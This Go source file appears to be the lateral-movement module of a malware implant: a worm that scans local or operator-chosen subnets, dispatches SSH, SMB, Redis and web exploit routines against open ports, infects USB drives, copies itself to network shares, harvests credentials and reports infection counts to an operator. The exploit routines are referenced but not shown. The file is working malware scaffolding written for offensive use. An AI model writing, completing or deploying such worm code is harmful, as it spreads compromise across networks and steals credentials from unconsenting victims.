package main

import (
	"fmt"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Worm implements the lateral-movement module. It is a scanner plus a
// set of real deploy vectors; every vector reports success only on a
// verified outcome, never on an attempt. It never runs at boot: it is
// activated solely by the "worm" operator command.
type Worm struct {
	subnets []*net.IPNet

	done chan struct{}
	wg   sync.WaitGroup
	sem  chan struct{} // concurrency cap for probes/exploits
	mu   sync.Mutex

	exploited  atomic.Int64
	hostsSeen  atomic.Int64
	portsOpen  atomic.Int64
	attempts   atomic.Int64
	findingsMu sync.Mutex
	findings   []string
}

var (
	wormMu     sync.Mutex
	activeWorm *Worm
)

// wormPortMap maps interesting TCP ports to the module that handles
// them. Only ports with a real implementation are listed.
var wormPortMap = map[string]string{
	"22":   "ssh",
	"445":  "smb",
	"6379": "redis",
	"80":   "web",
	"443":  "web",
	"8080": "web",
	"8443": "web",
}

// startWorm activates a single worm instance. payload may carry a CSV
// subnet override ("10.0.0.0/24,172.16.1.0/24"); empty means the local
// /24 (or SWIZ_WORM_SUBNETS).
func startWorm(payload string) error {
	wormMu.Lock()
	defer wormMu.Unlock()
	if activeWorm != nil {
		return fmt.Errorf("worm already running")
	}
	w, err := newWorm(payload)
	if err != nil {
		return err
	}
	activeWorm = w
	go w.run()
	logf("worm: started on %d subnet(s), vectors: ssh smb redis web usb share harvest", len(w.subnets))
	return nil
}

func stopWorm() {
	wormMu.Lock()
	defer wormMu.Unlock()
	if activeWorm != nil {
		activeWorm.stop()
		activeWorm = nil
	}
}

// newWorm resolves the target subnet list.
func newWorm(override string) (*Worm, error) {
	subnets, err := parseSubnets(override)
	if err != nil {
		return nil, err
	}
	return &Worm{
		subnets: subnets,
		done:    make(chan struct{}),
		sem:     make(chan struct{}, 256),
	}, nil
}

// parseSubnets parses a CSV of CIDRs; when empty it falls back to
// SWIZ_WORM_SUBNETS, then to the local /24.
func parseSubnets(override string) ([]*net.IPNet, error) {
	csv := override
	if csv == "" {
		csv = cfg.WormSubnets
	}
	if csv == "" {
		ip := localIP()
		if ip == nil || ip.To4() == nil {
			return nil, fmt.Errorf("no local IPv4 address and no subnet override (SWIZ_WORM_SUBNETS)")
		}
		ip = ip.To4()
		csv = fmt.Sprintf("%d.%d.%d.0/24", ip[0], ip[1], ip[2])
	}
	var out []*net.IPNet
	for _, part := range strings.Split(csv, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		_, n, err := net.ParseCIDR(part)
		if err != nil {
			return nil, fmt.Errorf("bad subnet %q: %w", part, err)
		}
		out = append(out, n)
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("no usable subnets from %q", csv)
	}
	return out, nil
}

// enumerateHosts lists host addresses in a network, skipping the
// network and broadcast addresses.
func enumerateHosts(n *net.IPNet) []string {
	ip := n.IP.To4()
	mask := n.Mask
	if ip == nil || len(mask) != 4 {
		return nil
	}
	ones, bits := mask.Size()
	if ones == bits { // /32
		return []string{ip.String()}
	}
	// number of host bits covers at most a /8 in practice
	// number of host bits covers at most a /8 in practice
	trueHosts := uint64(1) << uint(bits-ones)
	scan := trueHosts
	if scan > 4096 { // practical cap per pass; use /24-sized scopes in the field
		scan = 4096
	}
	netw := binaryUint32(ip) & binaryUint32(net.IP(mask))
	var out []string
	// skip network (0) and broadcast (max) when the subnet has room
	last := int(scan) - 1
	if trueHosts <= 2 {
		last = 0
	}
	for i := 1; i < last; i++ {
		out = append(out, uint32ToIP(netw+uint32(i)).String())
	}
	return out
}

func binaryUint32(ip net.IP) uint32 {
	v := ip.To4()
	return uint32(v[0])<<24 | uint32(v[1])<<16 | uint32(v[2])<<8 | uint32(v[3])
}

func uint32ToIP(n uint32) net.IP {
	return net.IPv4(byte(n>>24), byte(n>>16), byte(n>>8), byte(n))
}

// run drives the scan/exploit loops until Stop.
func (w *Worm) run() {
	defer func() { activeWorm = nil }()

	// auxiliary vectors that loop on their own cadence
	w.wg.Add(3)
	go w.spreadUSB()
	go w.spreadShares()
	go w.credentialHarvestLoop()

	for {
		for _, subnet := range w.subnets {
			if !w.running() {
				break
			}
			w.scanSubnet(subnet)
		}
		if !w.running() {
			break
		}
		select {
		case <-w.done:
			return
		case <-time.After(cfg.WormRescan):
		}
	}
}

func (w *Worm) running() bool {
	select {
	case <-w.done:
		return false
	default:
		return true
	}
}

func (w *Worm) stop() {
	select {
	case <-w.done:
	default:
		close(w.done)
	}
	w.wg.Wait()
}

// scanSubnet probes every host and dispatches open ports.
func (w *Worm) scanSubnet(n *net.IPNet) {
	hosts := enumerateHosts(n)
	logf("worm: scanning %d hosts in %s", len(hosts), n.String())
	portList := make([]string, 0, len(wormPortMap))
	for p := range wormPortMap {
		portList = append(portList, p)
	}

	var probeWg sync.WaitGroup
	for _, host := range hosts {
		if !w.running() {
			break
		}
		w.hostsSeen.Add(1)
		for _, port := range portList {
			probeWg.Add(1)
			w.sem <- struct{}{}
			go func(host, port string) {
				defer probeWg.Done()
				defer func() { <-w.sem }()
				conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 2*time.Second)
				if err != nil {
					return
				}
				conn.Close()
				w.portsOpen.Add(1)
				w.dispatch(host, wormPortMap[port], port)
			}(host, port)
		}
	}
	probeWg.Wait()
}

// dispatch runs the exploit module for one open service.
func (w *Worm) dispatch(host, vector, port string) {
	if !w.running() {
		return
	}
	w.sem <- struct{}{}
	defer func() { <-w.sem }()
	start := time.Now()
	var ok bool
	var detail string
	switch vector {
	case "ssh":
		ok, detail = w.exploitSSH(host)
	case "smb":
		ok, detail = w.exploitSMB(host)
	case "redis":
		ok, detail = w.exploitRedis(net.JoinHostPort(host, port))
	case "web":
		ok, detail = w.probeWeb(host, port)
	}
	// web is recon: report findings rather than claiming infections
	if vector == "web" && detail != "" {
		w.addFinding(detail)
		return
	}
	if ok {
		w.exploited.Add(1)
		logf("worm: [ok] %s via %s on %s (%s)", host, vector, port, time.Since(start).Round(time.Millisecond))
	} else if detail != "" {
		logf("worm: %s on %s: %s", host, vector, detail)
	}
}

func (w *Worm) addFinding(f string) {
	w.findingsMu.Lock()
	defer w.findingsMu.Unlock()
	if len(w.findings) >= 64 {
		return
	}
	w.findings = append(w.findings, f)
	logf("worm: finding: %s", f)
}

// Status returns a snapshot for operators.
type wormStatus struct {
	Running   bool     `json:"running"`
	Exploited int64    `json:"exploited"`
	HostsSeen int64    `json:"hosts_seen"`
	PortsOpen int64    `json:"ports_open"`
	Attempts  int64    `json:"attempts"`
	Findings  []string `json:"findings"`
}

func wormStatusOf() wormStatus {
	wormMu.Lock()
	defer wormMu.Unlock()
	if activeWorm == nil {
		return wormStatus{Running: false}
	}
	w := activeWorm
	return wormStatus{
		Running:   true,
		Exploited: w.exploited.Load(),
		HostsSeen: w.hostsSeen.Load(),
		PortsOpen: w.portsOpen.Load(),
		Attempts:  w.attempts.Load(),
		Findings:  append([]string(nil), w.findings...),
	}
}

// spreadUSB infects removable drives (Windows only; no-op elsewhere).
func (w *Worm) spreadUSB() {
	defer w.wg.Done()
	ticker := time.NewTicker(45 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-w.done:
			return
		case <-ticker.C:
			w.infectRemovableDrives()
		}
	}
}

// spreadShares copies the implant into writable network shares.
func (w *Worm) spreadShares() {
	defer w.wg.Done()
	ticker := time.NewTicker(90 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-w.done:
			return
		case <-ticker.C:
			w.sharesOnce()
		}
	}
}
